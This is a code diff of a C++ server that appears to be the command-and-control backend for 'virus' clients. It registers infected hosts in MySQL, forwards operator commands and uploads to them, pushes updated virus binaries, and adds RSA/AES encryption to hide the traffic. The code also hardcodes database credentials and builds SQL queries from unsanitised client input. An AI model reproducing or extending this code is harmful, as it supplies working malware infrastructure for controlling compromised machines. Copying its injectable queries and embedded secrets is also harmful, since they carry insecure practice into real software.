@@ -1,94 +1,40 @@
-#include <iostream>
-#include <stdio.h>
-#include <stdlib.h>
-#include <pthread.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <unistd.h>
-#include <string.h>
-#include <sstream>
-#include <mysql/mysql.h>
-#include <time.h>
-#include <vector>
+#include "main.h"
 
 #define VERSION 1070
 
-using namespace std;
- 
-struct Connection
-{ 
-    int sock;
-	string client_id;
-    sockaddr_in addr;
-	int pipefd[2];
-	int pipefd_sync[2];
-	char buf[4096];
-};
-
-//pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
-
-string itoa(long i)
-{
-    stringstream ss;
-    ss << i;
-    return ss.str();
-}
-
-// GLOBAL VARS //
-
 stringstream ss;
 string cid;
-
-void *thread_function( void *ptr );
-void *client_thread( void *ptr );
-void *client_thread_function( void *ptr );
-int readline (int s, string &str, int buffersize);
-vector<Connection*> connections;
-
-int update_client();
 MYSQL *mConnection;
-
-
-// GLOBAL VARS END //
+vector<Connection*> connections;
+RSA_Key pkey;
+RSA_Key pubkey;
 
 int main()
 {
-	srand(time(NULL));
-	MYSQL_RES *mTabelle;
-    MYSQL_ROW mRecord;
-    int mError;
-    mConnection = mysql_init(NULL);
-	mysql_real_connect(mConnection,"localhost","main","437280","main",3306,0,0);
-		
-    if (mConnection == NULL)  {
-        printf("Could not connect. Leaving: %s",mysql_error(mConnection));
-        return 1;
-    } else {
-		printf("Connected to MySQL-Server!\n");
-    }
-    //mysql_close(mConnection);
-	int result = mysql_query(mConnection, "SELECT * FROM log ORDER BY id DESC LIMIT 0,10");
-    if(result == 0) {
-		cout << "Query succeeded.\n" << endl; 
-		MYSQL_RES* res = mysql_store_result(mConnection);
-		MYSQL_ROW row = mysql_fetch_row(res);
-		for(int i = 0; i < mysql_num_fields(res); i++ ) {
-			cout << row[i] << "|";
-		}
-		cout << "\n" << endl;
-	} else {
-		cout << "ERROR!\n" << mysql_error(mConnection) << endl;
-	}	
+	if((mConnection = mysql()) == NULL) {
+		return 1;
+	}
 	
+	// RSA SHIT //
+
+	RSA_KeyPair keypair;
+	unsigned long seed;
+	ifstream urandom("/dev/urandom");
+	urandom.read((char*)&seed, sizeof(seed));
+	urandom.close();
+	RSA_GenerateKeyPair(&keypair, 2048, seed);
+	RSA_GetPrivateKey(&keypair, &pkey);
+	RSA_GetPublicKey(&keypair, &pubkey);
+	//memset(&keypair, 0, sizeof(keypair));
+	cout << "RSA keypair created!\n" << endl;
+
 	// VIRUS SOCKET //
 	int sock_server = socket(AF_INET, SOCK_STREAM, 0);
 	if(sock_server < 0)
-		{
-		    cout << "Error: Could not create socket!" << endl;
-		    return 1;
-		}
+	{
+		cout << "Error: Could not create socket!" << endl;
+		return 1;
+	}
 	int opt = 1;
 	setsockopt(sock_server, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
 
@@ -112,7 +58,7 @@ int main()
 
 	int sock_server2 = socket(AF_INET, SOCK_STREAM, 0);
 	if(sock_server2 < 0)
-		{
+	{
 		    cout << "Error: Could not create socket!" << endl;
 		    return 1;
 		}
@@ -137,11 +83,8 @@ int main()
 		
 	// SOCK SHIT END // 		
 
-
 	pthread_t client_control;
 	pthread_create(&client_control, NULL, client_thread, &sock_server2);
-
-
 	
 	int sock;
 	struct sockaddr_in addr;
@@ -164,7 +107,21 @@ int main()
 void *thread_function( void *ptr )
 {
 	Connection* c = (Connection*)ptr;
+	aes256_context ctx;
 
+	//Key-Exchange
+	unsigned char rsa_buf[512];
+	unsigned char rsa_tmp[256];
+	unsigned char aes_key[32];
+	RSA_PublicKeyToA(&pubkey, (char*)rsa_buf);
+	send(c->sock, rsa_buf, 256 + sizeof(pubkey.L), 0);
+	recv(c->sock, rsa_buf, 256, 0);
+	RSA_Encrypt(&pkey, (char*)rsa_buf, (char*)rsa_tmp);
+	YansPadding_Decrypt(rsa_tmp, 224, aes_key, 32);
+	aes256_init(&ctx, aes_key);
+	memset(rsa_buf, 0, 512);
+	memset(rsa_tmp, 0, 256);
+	memset(aes_key, 0, 32);
 
 	//char buf[4096];
     string sendback;
@@ -172,157 +129,184 @@ void *thread_function( void *ptr )
     //memset(buf, 0, 4096);
 	string error = "";
 	bool login;
-	
+
 	//while((res = recv(c->sock, &buf, 4096, 0)) > 0) {
+	char* _buf;
 	string buf;
-	while(readline(c->sock, buf, 4096) != -1) {
+	int rdc;
+	while((rdc = secure_read(c->sock, &ctx, &_buf)) != -1) {
+		buf = _buf;
 		if(buf[0] == '#') {
 			write(c->pipefd[1], buf.c_str(), buf.size() + 1);
 			//c->sss << buf << endl;
 			//pthread_cond_signal(&cond);
-		} else {
-
-		// TIME STAMP SECTION //
-		
-		time_t rawtime;
-		struct tm * timeinfo;
-		char buffer [80];
-
-		time (&rawtime);
-		timeinfo = localtime (&rawtime);
-
-		strftime (buffer,80,"[%Y/%m/%d, %H:%M:%S]:\n",timeinfo);
-  		cout << buffer << endl;
-		
-		// TIME STAMP SECTION END //		
-
-		//string data = buf;
-		//string buf_new = buf;
-		//buf.erase(std::remove(buf.begin(), buf.end(), '\n'), buf.end());
-		//buf_new = buf_new.substr(0,buf_new.length()-1);
-		//cout << "\t\"" << buf_new << "\"" << endl;
-		cout << "\t\"" << buf << "\"" << endl;
-		ss.str("");
-		ss.clear();	
-		ss
-		<< (c->addr.sin_addr.s_addr & 0x000000FF) << "."
-		<< ((c->addr.sin_addr.s_addr & 0x0000FF00) >> 8) << "."
-		<< ((c->addr.sin_addr.s_addr & 0x00FF0000) >> 16) << "."
-		<< ((c->addr.sin_addr.s_addr & 0xFF000000) >> 24);
-
-		//Unique client ID is 32bit hex string. Client is sending ID in front of the request.
-		cid = buf.substr(0,32);
-		cout << "\tChecking request..." << endl;
-		if(buf[32] == ':') {
-			if(cid == "00000000000000000000000000000000") {
-				cout << "\tCreating unique ID..." << endl;
-				string str;
-				string array = "abcdef0123456789";
-				for(int i = 0; i < 32; i++) {
-					int num = rand() % 16;
-					str += array[num];
-				}
-				int result = mysql_query(mConnection, 
-				("INSERT INTO clients (ip, date, joined, cid) VALUES ('"+ss.str()+"', '"+itoa(time(NULL))+"', '"+itoa(time(NULL))+"', '"+ str +"')").c_str());
-				
-				if(result == 0) {
-					sendback = string() + "#210-OK: id:" + str;
-		            send(c->sock, sendback.c_str(), sendback.size()+1, 0);
-					cout << "\tNew Client '"+ str +"' added.\n" << endl;
-				} else {
-					sendback = string() + "#510-ER: Query failed. " + mysql_error(mConnection);
-	                send(c->sock, sendback.c_str(), sendback.size()+1, 0);
-				}
-				login = true;
-			} else {
-				
-				cout << "\tMaking query..." << endl;
-				
-				int result = mysql_query(mConnection, ("SELECT * FROM clients WHERE cid = '" + cid + "'").c_str());
-				MYSQL_RES* res = mysql_store_result(mConnection);
-				cout << "\t" << string(&buf[32]) << endl;
-				if(login == false) { //&& string(&buf[32]) == ":login") {
-					
-					if(mysql_num_rows(res) == 0) {
-					//MYSQL_ROW row = mysql_fetch_row(res);
-						sendback = string() + "#540-ER: You seem not to have an ID.";
-						send(c->sock, sendback.c_str(), sendback.size()+1, 0);
-						cout << "\t" << cid  << ": ID not found." << endl;;
-						error += "Client has no ID.\n";
-					} else {
-						cout << "\t#220-OK: " << cid  << " has an ID.\n"  << endl;
-						sendback = string() + "#220-OK: You have an valid ID! Login succeeded.";
-						send(c->sock, sendback.c_str(), sendback.size()+1, 0);
-						c->client_id = cid;	
-
-						update_client();
-						
-						login = true;
-						connections.push_back(c);
-					}
-
-				} else {
-		
-					if(string(&buf[33]) == "") {
-						sendback = string() + "#300-ER: Empty String given.";
-						send(c->sock, sendback.c_str(), sendback.size()+1, 0);
-					} else if(string(&buf[33]) == "update") {
-						int client_version = VERSION;
-						int remote_version = atoi(string(&buf[33]).substr(4).c_str());
-
-						if(remote_version < client_version) {
-							string sendback = string() + "#260-OK: New version available";
-							send(c->sock, sendback.c_str(), sendback.size()+1, 0);
-
-							cout << "\tUpdate" << endl;	
-
-						} else {
-							string sendback = "#270-OK: Latest version: " + client_version;	
-							send(c->sock, sendback.c_str(), sendback.size()+1, 0);
-						}
-					} else if(string(&buf[33]) == "ping") {
-						sendback = string()+ "#200-OK: pong";
-						send(c->sock, sendback.c_str(), sendback.size()+1, 0);		
-					} else if(string(&buf[33]) == "test") {
-						sendback = string()+ "#230-OK: TEST";
-		                send(c->sock, sendback.c_str(), sendback.size()+1, 0);
-					} else if(string(&buf[33]).substr(0, 4) == "bin:") {
-						long size = atoi(string(&buf[33]).substr(4).c_str());
-						short readcount;
-						while(size > 0)
-						{
-							if(size < 4096)
-								readcount = recv(c->sock, c->buf, size, 0);
-							else
-								readcount = recv(c->sock, c->buf, 4096, 0);
-							write(c->pipefd[1], &readcount, 2);
-							read(c->pipefd_sync[0], &readcount, 2);
-							size -= readcount;
-						}
-					} else {
-						sendback = string()+ "#510-ER: Command not found.";
-	                    send(c->sock, sendback.c_str(), sendback.size()+1, 0);
-						cout << "\t#510-ER: Command not found" << endl; 
-					}
-
-					if(error == "") {
-						cout << "\tEverything OK!\n" << endl;
-					} else  {
-						cout << string() + error << endl;
-					}
-
-				}
-			}	
+		} else if(buf.size() > 32) {
+			// TIME STAMP SECTION //
 			
-		} else {
-            sendback = string() + "#500-ER: Wrong request sent:" + buf;
-            send(c->sock, sendback.c_str(), sendback.size()+1, 0);
-			cout << "#500-ER: " << cid << " sent wrong request" << endl;
-        }
+			time_t rawtime;
+			struct tm * timeinfo;
+			char buffer [80];
+
+			time (&rawtime);
+			timeinfo = localtime (&rawtime);
+
+			strftime (buffer,80,"[%Y/%m/%d, %H:%M:%S]:\n",timeinfo);
+			cout << buffer << endl;
+			
+			// TIME STAMP SECTION END //		
+
+			//string data = buf;
+			//string buf_new = buf;
+			//buf.erase(std::remove(buf.begin(), buf.end(), '\n'), buf.end());
+			//buf_new = buf_new.substr(0,buf_new.length()-1);
+			//cout << "\t\"" << buf_new << "\"" << endl;
+			cout << "\t\"" << buf << "\"" << endl;
+			ss.str("");
+			ss.clear();	
+			ss
+			<< (c->addr.sin_addr.s_addr & 0x000000FF) << "."
+			<< ((c->addr.sin_addr.s_addr & 0x0000FF00) >> 8) << "."
+			<< ((c->addr.sin_addr.s_addr & 0x00FF0000) >> 16) << "."
+			<< ((c->addr.sin_addr.s_addr & 0xFF000000) >> 24);
+
+			//Unique client ID is 32bit hex string. Client is sending ID in front of the request.
+			cout << "\tChecking request..." << endl;
+			if(buf[32] == ':') {
+				cid = buf.substr(0,32);
+				if(cid == "00000000000000000000000000000000") {
+					cout << "\tCreating unique ID..." << endl;
+					string str;
+					string array = "abcdef0123456789";
+					for(int i = 0; i < 32; i++) {
+						int num = rand() % 16;
+						str += array[num];
+					}
+					int result = mysql_query(mConnection, 
+					("INSERT INTO clients (ip, date, joined, cid) VALUES ('"+ss.str()+"', '"+itoa(time(NULL))+"', '"+itoa(time(NULL))+"', '"+ str +"')").c_str());
+					
+					if(result == 0) {
+						sendback = string() + "#210-OK: id:" + str;
+						secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+						cout << "\tNew Client '"+ str +"' added.\n" << endl;
+					} else {
+						sendback = string() + "#510-ER: Query failed. " + mysql_error(mConnection);
+						secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+					}
+					login = true;
+				} else {
+					
+					cout << "\tMaking query..." << endl;
+					
+					int result = mysql_query(mConnection, ("SELECT * FROM clients WHERE cid = '" + cid + "'").c_str());
+					MYSQL_RES* res = mysql_store_result(mConnection);
+					cout << "\t" << string(&buf[32]) << endl;
+					if(login == false) { //&& string(&buf[32]) == ":login") {
+						
+						if(mysql_num_rows(res) == 0) {
+						//MYSQL_ROW row = mysql_fetch_row(res);
+							//sendback = string() + "#540-ER: You seem not to have an ID.";
+							sendback = string() + "#310-ER: You seem not to have an ID.";
+							secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+							cout << "\t" << cid  << ": ID not found." << endl;;
+							error += "Client has no ID.\n";
+						} else {
+							cout << "\t#220-OK: " << cid  << " has an ID.\n"  << endl;
+							sendback = string() + "#220-OK: You have an valid ID! Login succeeded.";
+							secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+							c->client_id = cid;	
+
+							update_client();
+							
+							login = true;
+							connections.push_back(c);
+						}
+
+					} else {
+			
+						if(string(&buf[33]) == "") {
+							sendback = string() + "#300-ER: Empty String given.";
+							secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+						} else if(string(&buf[33]).substr(0,6) == "update") {
+							int client_version = VERSION;
+							int remote_version = atoi(string(&buf[33]).substr(7).c_str());
+							
+							if(remote_version < client_version) {
+								string sendback = string() + "#260-OK: New version available";
+								secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+
+								cout << "\tUpdate" << endl;
+							
+								string infile = "/home/data/projects/virus";
+								ifstream f_update(infile.c_str());
+								
+								f_update.seekg(0, ios_base::end);
+								long size = f_update.tellg();
+								f_update.seekg(0, ios_base::beg);
+								
+								string update_size = itoa(size);
+								sendback = "#280-OK: "+ update_size;
+								secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+
+								short readcount;
+								char buf[4096];
+								while(f_update.good())
+								{
+									f_update.read(buf, 4096);
+									if(size > 4096)
+										secure_send(c->sock, &ctx, buf, 4096);
+									else
+										secure_send(c->sock, &ctx, buf, size);
+									size -= 4096;
+								}	
+					
+							} else {
+								string version = itoa(remote_version);
+								string sendback = string() + "#270-OK: Latest version: " + version;	
+								secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+								cout << "\tNo Update required" << endl;
+							}
+						} else if(string(&buf[33]) == "ping") {
+							sendback = string()+ "#200-OK: pong";
+							secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+						} else if(string(&buf[33]) == "test") {
+							sendback = string()+ "#230-OK: TEST";
+							secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+						} else if(string(&buf[33]).substr(0, 4) == "bin:") {
+							long size = atoi(string(&buf[33]).substr(4).c_str());
+							short readcount;
+							while(size > 0)
+							{
+								readcount = secure_read(c->sock, &ctx, &c->buf);
+								write(c->pipefd[1], &readcount, 2);
+								read(c->pipefd_sync[0], &readcount, 2);
+								size -= readcount;
+								free(c->buf);
+							}
+						} else {
+							sendback = string()+ "#510-ER: Command not found.";
+							secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+							cout << "\t#510-ER: Command not found" << endl; 
+						}
+						if(error == "") {
+							cout << "\tEverything OK!\n" << endl;
+						} else  {
+							cout << string() + error << endl;
+						}
+
+					}
+				}	
+				
+			} else {
+				sendback = string() + "#500-ER: Wrong request sent:" + buf;
+				secure_send(c->sock, &ctx, sendback.c_str(), sendback.size() + 1);
+				cout << "#500-ER: " << cid << " sent wrong request" << endl;
+			}
 
 		}
+		if(_buf) free(_buf);
 	}
-	sendback = "#340-ER: Virus lost connection\n";
+	sendback = "#340-ER: " + cid + " lost connection\n\n";
+	cout << sendback << endl;
 	write(c->pipefd[1], sendback.c_str(), sendback.size() + 1);
 	close(c->pipefd[1]);
 	//pthread_cond_signal(&cond);
@@ -352,14 +336,14 @@ void* client_thread ( void *ptr ) {
 		int res;
 		memset(buf, 0, 4096);	
 	}
-	
+	cout << "EchoClient lost connection" << endl;
 		
 }
 
 void* client_thread_function ( void *ptr ) {
 	int sock = *(int*)ptr;
 	string data;
-	while(readline(sock, data, 4096) != -1) {
+	while(readline(sock, data) != -1) {
 
 		int result = mysql_query(mConnection,
 			("SELECT * FROM main.clients WHERE cid = '"+data+"'").c_str());
@@ -376,6 +360,7 @@ void* client_thread_function ( void *ptr ) {
 
 					pipe(virus->pipefd);
 					pipe(virus->pipefd_sync);
+					
 					string sendback = "#240-OK: Client exists, connected.";
 					send(sock, sendback.c_str(), sendback.size()+1, 0);
 
@@ -386,7 +371,7 @@ void* client_thread_function ( void *ptr ) {
 					string client_data;
 					int res = 1;
 					int i = 0;
-					while( readline(sock, client_data, 4096) != -1 && res == 1) {
+					while( readline(sock, client_data) != -1 && res == 1) {
 						client_data = "#500-CO: " + client_data;
 						send(virus->sock, client_data.c_str(), client_data.size()+1, 0);
 						if(client_data.substr(9,7) == "upload ")
@@ -459,18 +444,16 @@ void* client_thread_function ( void *ptr ) {
 
 // PAUSE //
 
-int readline (int s, string &str, int buffsize)
+int readline ( int socket, string& str )
 {
-    str = "";
-    int ret = 0;
-    char nc = 0;
-    for(int i = 0; i < buffsize; i++)
-    {
-        if(recv(s, &nc, 1, 0) != 1) return -1;
-        if(nc == 0) return i;
-        str += nc;
-    }
-    return str.size();
+    int res;
+	char buf;
+	str = "";
+	while((res = read(socket, &buf, 1)) == 1 && buf != 0)
+		str += buf;
+		if(res != 1)
+			return -1;
+	return str.size();
 }
 
 // PAUSE // 
@@ -486,4 +469,63 @@ int update_client()
 		return -1;
 	}
 				
+}
+
+string itoa(long i)
+{
+    stringstream ss;
+    ss << i;
+    return ss.str();
+}
+
+int secure_send(int sock, aes256_context* ctx, const char* data, int size) {
+    unsigned char buf[32];
+    memset(buf, 0, 32);
+    memcpy(buf, (char*)&size, sizeof(size));
+    aes256_encrypt_ecb(ctx, buf);
+    send(sock, (char*)buf, 32, 0);
+
+    for(int i = 0; i < size; i += 32) {
+        if(size - i >= 32)
+            memcpy(buf, &data[i], 32);
+        else {
+            memset(buf, 0, 32);
+            memcpy(buf, &data[i], size - i);
+        }
+        aes256_encrypt_ecb(ctx, buf);
+        if(send(sock, (char*)buf, 32, 0) != 32)
+            return -1;
+    }
+	return size;
+}
+
+int secure_read(int sock, aes256_context* ctx, char** data) {
+    int size;
+    unsigned char buf[32];
+    if(recv(sock, (char*)buf, 32, 0) != 32)
+		return -1;
+    aes256_decrypt_ecb(ctx, buf);
+	for(int i = 0; i < 32; i++)
+		cout <<	hex << (int)buf[i] << dec << ' ';
+	cout << endl;
+    size = *(int*)&buf[0];
+	cout << size << endl;
+	if(size < 0)
+		return -1;
+    *data = (char*)malloc(size);
+
+    for(int i = 0; i < size; i += 32) {
+        if(recv(sock, (char*)buf, 32, 0) != 32)
+		{
+			free(*data);
+			*data = 0;
+            return -1;
+		}
+        aes256_decrypt_ecb(ctx, buf);
+        if(size - i >= 32)
+            memcpy(&(*data)[i], buf, 32);
+        else
+            memcpy(&(*data)[i], buf, size - i);
+    }
+    return size;
 }
